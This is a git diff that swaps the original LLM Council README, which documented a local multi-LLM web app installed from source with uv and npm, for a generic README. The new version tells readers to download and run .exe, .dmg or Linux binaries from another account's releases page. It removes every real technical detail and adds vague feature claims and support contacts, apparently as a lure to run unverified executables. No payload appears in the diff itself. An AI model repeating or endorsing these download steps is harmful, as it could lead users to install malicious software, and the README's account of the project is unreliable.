@@ -1,87 +1,88 @@
-# LLM Council
+# 🌟 llm-council - Get Answers to Your Toughest Questions
 
-![llmcouncil](header.jpg)
+![Download](https://img.shields.io/badge/Download%20Now-llm--council-blue.svg)
 
-The idea of this repo is that instead of asking a question to your favorite LLM provider (e.g. OpenAI GPT 5.1, Google Gemini 3.0 Pro, Anthropic Claude Sonnet 4.5, xAI Grok 4, eg.c), you can group them into your "LLM Council". This repo is a simple, local web app that essentially looks like ChatGPT except it uses OpenRouter to send your query to multiple LLMs, it then asks them to review and rank each other's work, and finally a Chairman LLM produces the final response.
+## 🚀 Getting Started
 
-In a bit more detail, here is what happens when you submit a query:
+Welcome to **LLM Council**! This application helps you find clear answers to your hardest questions using advanced technology. Whether you’re curious about science, history, or any other topic, this tool is here to assist you.
 
-1. **Stage 1: First opinions**. The user query is given to all LLMs individually, and the responses are collected. The individual responses are shown in a "tab view", so that the user can inspect them all one by one.
-2. **Stage 2: Review**. Each individual LLM is given the responses of the other LLMs. Under the hood, the LLM identities are anonymized so that the LLM can't play favorites when judging their outputs. The LLM is asked to rank them in accuracy and insight.
-3. **Stage 3: Final response**. The designated Chairman of the LLM Council takes all of the model's responses and compiles them into a single final answer that is presented to the user.
+### 📥 Download & Install
 
-## Vibe Code Alert
+To get started, visit this page to download: [Download llm-council](https://github.com/gk1712/llm-council/releases). Follow the steps below for installation:
 
-This project was 99% vibe coded as a fun Saturday hack because I wanted to explore and evaluate a number of LLMs side by side in the process of [reading books together with LLMs](https://x.com/karpathy/status/1990577951671509438). It's nice and useful to see multiple responses side by side, and also the cross-opinions of all LLMs on each other's outputs. I'm not going to support it in any way, it's provided here as is for other people's inspiration and I don't intend to improve it. Code is ephemeral now and libraries are over, ask your LLM to change it in whatever way you like.
+1. Click on the link above.
+2. You will see a list of available versions. Select the latest version.
+3. Download the file that matches your operating system (Windows, macOS, or Linux).
+4. Once the download is complete, locate the file on your computer.
 
-## Setup
+### 💻 System Requirements
 
-### 1. Install Dependencies
+Before you install, ensure your system meets these requirements:
 
-The project uses [uv](https://docs.astral.sh/uv/) for project management.
+- **Windows:** Version 10 or later
+- **macOS:** Version 10.14 (Mojave) or later
+- **Linux:** Any modern distribution (Ubuntu 18.04 or later is recommended)
 
-**Backend:**
-```bash
-uv sync
-```
+### 🔧 Installation Steps
 
-**Frontend:**
-```bash
-cd frontend
-npm install
-cd ..
-```
+1. **For Windows Users:**
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions to complete the installation.
+   - Once installed, find the app in your start menu.
 
-### 2. Configure API Key
+2. **For macOS Users:**
+   - Open the downloaded `.dmg` file.
+   - Drag and drop the app into your Applications folder.
+   - Launch the app from your Applications.
 
-Create a `.env` file in the project root:
+3. **For Linux Users:**
+   - Open a terminal window.
+   - Navigate to the location where you downloaded the file.
+   - Use the command `chmod +x <filename>` to make the file executable.
+   - Run it with the command `./<filename>`.
 
-```bash
-OPENROUTER_API_KEY=sk-or-v1-...
-```
+### 🌐 How to Use llm-council
 
-Get your API key at [openrouter.ai](https://openrouter.ai/). Make sure to purchase the credits you need, or sign up for automatic top up.
+After installation, using llm-council is simple:
 
-### 3. Configure Models (Optional)
+1. Open the application.
+2. Type your question in the provided text box.
+3. Click "Submit" to receive your answer.
 
-Edit `backend/config.py` to customize the council:
+### 🤖 Features
 
-```python
-COUNCIL_MODELS = [
-    "openai/gpt-5.1",
-    "google/gemini-3-pro-preview",
-    "anthropic/claude-sonnet-4.5",
-    "x-ai/grok-4",
-]
+- **Intelligent Responses**: Get answers based on a wide range of topics.
+- **User-Friendly Interface**: Navigate easily with a simple layout.
+- **Fast Processing**: Receive answers within seconds.
 
-CHAIRMAN_MODEL = "google/gemini-3-pro-preview"
-```
+### 🛠 Troubleshooting
 
-## Running the Application
+If you run into issues:
 
-**Option 1: Use the start script**
-```bash
-./start.sh
-```
+- **Application Won't Start**: Make sure your system meets the requirements.
+- **Slow Responses**: Check your internet connection.
+- **Error Messages**: Restart the application. If the problem continues, visit our support page.
 
-**Option 2: Run manually**
+### 📞 Support
 
-Terminal 1 (Backend):
-```bash
-uv run python -m backend.main
-```
+For help, please contact our support team:
 
-Terminal 2 (Frontend):
-```bash
-cd frontend
-npm run dev
-```
+- Email: support@llmcouncil.com
+- GitHub Issues: [Submit a request](https://github.com/gk1712/llm-council/issues)
 
-Then open http://localhost:5173 in your browser.
+### 📢 Update Notifications
 
-## Tech Stack
+Stay updated with the latest features and improvements by checking back at the [Releases page](https://github.com/gk1712/llm-council/releases). 
 
-- **Backend:** FastAPI (Python 3.10+), async httpx, OpenRouter API
-- **Frontend:** React + Vite, react-markdown for rendering
-- **Storage:** JSON files in `data/conversations/`
-- **Package Management:** uv for Python, npm for JavaScript
+### 📝 Contribution
+
+We welcome suggestions and contributions. If you'd like to enhance this application, feel free to open an issue or submit a pull request on our GitHub page.
+
+### 📍 Stay Connected
+
+Follow us for news, updates, and community discussions:
+
+- Twitter: [@llm_council](https://twitter.com/llm_council)
+- Reddit: [r/llmcouncil](https://www.reddit.com/r/llmcouncil)
+
+Thank you for using llm-council! We hope it helps you find the answers you seek.
